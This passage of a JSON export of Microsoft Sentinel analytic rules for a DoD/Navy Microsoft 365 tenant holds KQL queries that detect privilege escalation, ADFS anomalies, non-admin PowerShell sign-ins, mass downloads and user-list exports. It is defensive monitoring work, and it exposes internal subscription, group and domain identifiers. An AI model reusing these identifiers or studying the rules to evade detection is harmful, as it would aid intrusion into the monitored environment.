parse_json(tostring(InitiatedBy.user)).userPrincipalName, TargetUser = TargetResources[0].userPrincipalName\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUser"},{"identifier":"AadUserId","columnName":"TargetUser"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"GroupName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Add/Remove user MDE Analysts Groups (policy)","enabled":true,"description":"Modification to RG-Level 2 MDE Groups by User (T1, T2, T3)","alertRuleTemplateName":null,"lastModifiedUtc":"2024-05-22T15:23:40.7907748Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/78e8f755-77ee-4479-8963-86cd908951f0","name":"78e8f755-77ee-4479-8963-86cd908951f0","etag":"\"1700cb2e-0000-2700-0000-63c8167d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//This query to find users that are assigning roles.\nAuditLogs\n| where InitiatedBy.user.userPrincipalName has \".dod365.adm.mil\"\n    and (ActivityDisplayName has \"Add eligible member to role in PIM completed (timebound)\"\n    or ActivityDisplayName has \"Add member to role in PIM completed (timebound)\")\n| project\n    TimeGenerated,\n    InitiatedBy.user.userPrincipalName,\n    ActivityDisplayName,\n    TargetResources[2].displayName,\n    TargetResources[0].displayName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatedBy_user_userPrincipalName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetResources_0_displayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetResources_2_displayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"ActivityDisplayName"}]}],"alertDetailsOverride":{"alertDisplayNameFormat":"Eligible role assigned to user.","alertDescriptionFormat":"A user has been assigned a priviledged role.","alertTacticsColumnName":"InitiatedBy_user_userPrincipalName","alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":[],"displayName":"DoD365-J - Priviledged role escalation","enabled":false,"description":"Identify when roles are assigned to users.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:55:41.7234338Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fa72d599-a62e-4a40-b000-d8fdb127933b","name":"fa72d599-a62e-4a40-b000-d8fdb127933b","etag":"\"17002a4c-0000-2700-0000-63c819420000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4649\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":[],"displayName":"DoD365-J - ADFS replay attack was detected.","enabled":false,"description":"A replay attack was detected. May be a harmless false positive due to misconfiguration error. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor ","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:07:30.1618736Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/624a7047-acfa-4263-9fef-3929bdf3cfe1","name":"624a7047-acfa-4263-9fef-3929bdf3cfe1","etag":"\"1700cc8b-0000-2700-0000-63c81fde0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\r\n| where ActivityDisplayName contains \"Add member to group\"\r\n| where TargetResources contains \"ADMINS\"\r\n| where parse_json(tostring(InitiatedBy.app)).userPrincipalName !contains \"admin\"\r\n| where parse_json(tostring(InitiatedBy.app)).displayName != \"Microsoft Approval Management\"\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":[],"displayName":"DoD365-J - User Added to Privileged ADMIN Group","enabled":false,"description":"Detects users being added to the Navy ADMIN group outside of the dynamic role assignment","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:35:42.453601Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/35ff4327-957d-4e24-8fe5-d27c2439d407","name":"35ff4327-957d-4e24-8fe5-d27c2439d407","etag":"\"1700b252-0000-2700-0000-63c819e40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4964\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - ADFS Special groups have been assigned to a new logon","enabled":false,"description":"Special groups have been assigned to a new logon. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:10:12.403783Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a088f2da-82da-4723-b86b-5fe4584844da","name":"a088f2da-82da-4723-b86b-5fe4584844da","etag":"\"1700974f-0000-2700-0000-63c819950000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4765\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - ADFS SID History was added to an account","enabled":false,"description":"SID History was added to an account. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:08:53.5944104Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3384a671-0595-43b9-ac6b-b2a6abe51675","name":"3384a671-0595-43b9-ac6b-b2a6abe51675","etag":"\"160037d9-0000-2700-0000-63c80def0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs \n| where TargetResources[1].id == \"cde2267a-071c-4798-826f-e184ed7f4260\"\n| project TimeGenerated, ActivityDisplayName, GroupName = parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)), InitiatedBy = parse_json(tostring(InitiatedBy.user)).userPrincipalName, TargetUser = TargetResources[0].userPrincipalName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Add/Remove to CSSP Admin (Tier 3)","enabled":false,"description":"Changes made to the N34 MSFT Tier 3 membership","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:19:11.1415107Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ef74ea70-caed-4c14-9f49-ecfdae7fa524","name":"ef74ea70-caed-4c14-9f49-ecfdae7fa524","etag":"\"1700102b-0000-2700-0000-63c816310000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//PowerShell for Azure AD, SharePoint Online, and Exchange Online Query\nSigninLogs\n//| where TimeGenerated < ago (0d)\n| where AppId in (\"1b730954-1685-4b74-9bfd-dac224a7b894\", \"1950a258-227b-4e31-a9cf-717495945fc2\", \"fb78d390-0c51-40cd-8e17-fdbfab77341b\", \"9bc3ab49-b65d-410a-85ad-de819febfddc\", \"12128f48-ec9e-42f0-b203-ea49fb6af367\",\n    \"ee62de39-b9b0-4886-aa58-08b89c4e3db3\")\n| where UserPrincipalName !has '.admin@flankspeed.onmicrosoft.us' and UserPrincipalName has '@us.navy.mil'\n| sort by TimeGenerated\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    AppDisplayName,\n    IPAddress,\n    ConditionalAccessPolicies\n| extend IPCustomEntity = IPAddress, AccountCustomEntity = UserPrincipalName\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":[],"displayName":"DoD365-J - Powershell Sign-ins Detected by User Accounts","enabled":false,"description":"Detects PowerShell sign-ins from any user that is not an Administrative Account. ","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:54:25.3532211Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/76241584-4a01-44d2-a577-80aaed81baf7","name":"76241584-4a01-44d2-a577-80aaed81baf7","etag":"\"1600f1f2-0000-2700-0000-63c810900000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let timeRange = 1d;\nlet threshold = 25;\nlet ranges = toscalar(_GetWatchlist('DODIP')| summarize match = make_list(SearchKey));\nlet DL = materialize(\n    OfficeActivity\n\t| where TimeGenerated >= ago(timeRange)\n    | where Operation contains \"FileDownload\" and Operation != \"FileSyncDownloadedFull\"\n\t);\nlet match = materialize(\n    DL\n\t| mv-apply inDOD = ranges to typeof(string) on \n        (\n        where (ipv4_is_match(ClientIP, inDOD))\n        )\n    | summarize by ClientIP\n    );\n    DL\n\t| join kind = leftanti(\n        match\n        ) \n        on $left.ClientIP == $right.ClientIP\n| summarize \n\tStartTime = min(TimeGenerated),\n\tEndTime = max(TimeGenerated),\n\tIPAddress = make_set(ClientIP),\n\tIPAddressCount = dcount(ClientIP),\n\tAppDisplayName = make_set(OfficeWorkload),\n\tDownloadCount = count()\n\tby UserId\n| where DownloadCount > threshold ","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"P1D","matchingMethod":"AnyAlert","groupByEntities":[],"groupByAlertDetails":["DisplayName"],"groupByCustomDetails":[]}},"customDetails":{"NumberOfDownloads":"DownloadCount","IPs":"IPAddress"},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"AlertPerResult"},"tactics":["Exfiltration","Collection"],"techniques":[],"displayName":"DoD365-J - Mass Download to Non-DOD IP","enabled":false,"description":"This alert will fire (once every 24hrs) if a user downloads 25 or more files to an IP not in the DODIP watchlist; see watchlist description for more information. ","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:30:24.2849137Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c7b7ba51-945c-46e8-bc20-3dbb540bd74d","name":"c7b7ba51-945c-46e8-bc20-3dbb540bd74d","etag":"\"17002036-0000-2700-0000-63c8174f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P3D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Looks for domain trust modifications:\n// 4706 - A new trust was created to a domain.\n// 4716 - Trusted domain information was modified.\nSecurityEvent\n| where Activity has_any (\"4706\", \"4716\")\n| extend ActivityID = Activity\n| extend Actor = SubjectAccount\n| extend Domain = SubjectDomainName\n| extend Device = Computer\n| project ActivityID, Actor, Device, Domain","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"P1D","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - ADFS Trust Settings Modified","enabled":false,"description":"Looks for domain trust modifications:\n4706 - A new trust was created to a domain.\n4716 - Trusted domain information was modified.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:59:11.9159443Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/60b2a431-35af-4a5d-a601-ce2da80a3142","name":"60b2a431-35af-4a5d-a601-ce2da80a3142","etag":"\"160059d1-0000-2700-0000-63c80d100000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\n| where ActivityDisplayName contains \"Download users\"\n| extend timestamp = ActivityDateTime\n| extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| where userPrincipalName !contains \"dod365.\"\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"userPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration"],"techniques":[],"displayName":"DoD365-J - User List Downloaded from AzureAD","enabled":false,"description":"Azure AD User List Exported from Azure. ","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:15:28.6925804Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/114a6906-af19-44e8-8390-d5efe03898ab","name":"114a6906-af19-44e8-8390-d5efe03898ab","etag":"\"1700e094-0000-2700-0000-63c820e90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\n| where ActivityDisplayName contains \"Add user\"\n| where InitiatedBy !contains \"sync\"\n| extend\n    timestamp = ActivityDateTime,\n    createdBy = parse_json(tostring(InitiatedBy.user)).userPrincipalName,\n    createdAcct =  parse_json(tostring(parse_json(tostring(parse_json(TargetResources[0]).userPrincipalName))))\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"createdBy"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"createdAcct"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":[],"displayName":"DoD365-J - User Added","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:40:09.4804233Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e4953b61-c690-45ab-873a-07d231127471","name":"e4953b61-c690-45ab-873a-07d231127471","etag":"\"1700f395-0000-2700-0000-63c821040000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Informational","query":"AuditLogs \n| where TargetResources[1].id in (\n    \"cb21406c-0618-4e49-86a7-93abc9d1872e\", \n    \"647e5928-aeaf-4b1d-9490-824d4b8f45b7\", \n    \"47c6de91-8541-4bdd-bd50-b930e05da61b\",\n    \"587eadc5-af10-4adf-b060-9ddf0f268977\",\n    \"ea7064c5-64e7-4031-b8c5-a2cf6743916b\",\n    \"b8956462-7dbc-4b72-9e29-8bd7bb9c4a36\",\n    \"dee258d7-4694-410f-9fdd-d741fbae967b\",\n    \"91418588-9647-4cfa-b281-def02e53b166\",\n    \"e7c7dab7-25b1-4eb0-8ebe-0f442b608a89\",\n    \"f190ed26-6097-4eaa-a4a4-510462004015\",\n    \"05b2ec2c-3636-4db4-bdaf-fcd2d86aa105\",\n    \"d9f58cc8-3410-4609-87af-83d4f6e86aa7\",\n    \"e2eba35f-28ed-465f-b9f0-3d35653ae3dd\",\n    \"be82d229-e98f-43a9-a4ad-8ca5f11a12bf\",\n    \"b9ca7afe-0749-4a35-8d87-654302351b7b\",\n    \"25f6d28d-9d2e-427e-b887-ea058ed0bbfa\",\n    \"ea18eb62-3117-421e-b09b-612f4096146d\",\n    \"7cc65410-e12e-412e-92ba-a7ca72a25111\",\n    \"151c3002-3eb1-434e-9d6b-e1a797eb3cf1\",\n    \"b24dfbed-e5f5-4f2f-883b-16b32c213fcd\",\n    \"da817b7c-a00e-459d-874e-48c54ed0d83b\",\n    \"21a109fd-e49c-4d81-9863-593132b35447\",\n    \"38ebeba9-b7a3-41bd-a949-e344b848db2b\",\n    \"188cbf79-5dc5-4f77-b646-a2711c03fc00\",\n    \"f402686b-5726-479c-bcc0-fda957c9b007\",\n    \"4e34bcf0-3b87-4fb6-a15c-bc7fdcd8602b\",\n    \"a438dd8f-6ae5-4d93-a918-d978daab39b6\"\n    )\n| where parse_json(tostring(InitiatedBy.app)).displayName == \"MS-PIM-Fairfax\"\n| sort by TimeGenerated desc nulls last \n| project TimeGenerated, ActivityDisplayName, Result, GroupName = parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)), UserInitiated = parse_json(tostring(InitiatedBy.app)).displayName, TargetUser = TargetResources[0].userPrincipalName\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Add/Remove user MDE group by MS-PIM-Fairfax","enabled":false,"description":"MDE Group Modification by MS-PIM-Fairfax","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:40:36.5919704Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d6e875cf-ea9b-4fb8-94b9-f87a1323f92d","name":"d6e875cf-ea9b-4fb8-94b9-f87a1323f92d","etag":"\"17002b94-0000-2700-0000-63c820d30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Get Smart Lockout Events from AAD SignIn Logs\nSigninLogs\n| where ResultType == \"50053\"\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserDisplayName\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"AlertPerResult"},"tactics":["CredentialAccess","Discovery"],"techniques":[],"displayName":"DoD365-J - Smart Lockout Event Detected","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:39:47.9147395Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a3e1a2fb-3253-48ef-af55-b220c5a4dcfc","name":"a3e1a2fb-3253-48ef-af55-b220c5a4dcfc","etag":"\"1600c7cd-0000-2700-0000-63c80caa0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Informational","query":"AuditLogs\n| where ActivityDisplayName contains \"disable account\"\n| where parse_json(tostring(InitiatedBy.user)).userPrincipalName contains \"sync\"\n| project AADOperationType, parse_json(tostring(InitiatedBy.user)).userPrincipalName, TargetResources[0].userPrincipalName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatedBy_user_userPrincipalName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetResources_0_userPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - User account disabled (GDS)","enabled":false,"description":"Query to detect user accounts that have been disabled by GDS in the last 24 hours","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:13:46.236089Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4f7c5c9c-15f2-4f48-95fa-fc8a20b1cdbf","name":"4f7c5c9c-15f2-4f48-95fa-fc8a20b1cdbf","etag":"\"1600f8d2-0000-2700-0000-63c80d3a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\r\n//This query will find the most recent \"IsCompliant == false\" updates and filter out any devices that have been corrected.\r\n    //filters events on a modified boolean property labeled as \"IsCompliant\"\r\n    | where parse_json(tostring(TargetResources[0].modifiedProperties))[0].displayName == \"IsCompliant\"\r\n    //displays relevant fields and renames them\r\n    | project\r\n        IsCompliant = tostring(parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue))[0]),\r\n        DeviceName = TargetResources[0].displayName,\r\n        TimeGenerated\r\n    //finds only the most recent updated modified value by unique device ID\r\n    | summarize arg_max(TimeGenerated, IsCompliant) by tostring(DeviceName)\r\n    //filters out the only the devices marked as not compliant\r\n    | where IsCompliant == \"false\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"PT8H","matchingMethod":"AnyAlert","groupByEntities":["Host"],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"DeviceName":"DeviceName"},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - Intune Managed Device(s) No Longer Compliant (policy)","enabled":false,"description":"Searches 'AuditLogs' for devices updated by Microsoft Intune as no longer compliant.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:16:10.1107361Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f8f7fe1f-4163-474e-a3a4-9d9038372168","name":"f8f7fe1f-4163-474e-a3a4-9d9038372168","etag":"\"870018d2-0000-2700-0000-66fdc98f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Reference: https://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/\n//Title: BAH_IOCs_RelatedTo_DEV-0569\n//Description: This analytic looks for IOCs related to the malicious payload BATLOADER which has been used to deploy the most recent/notable Royal Ransomware (DEV-0569)\n//Author: Steven Wan\n//False Positives: None applicable at this time.\n\nlet hashlist = 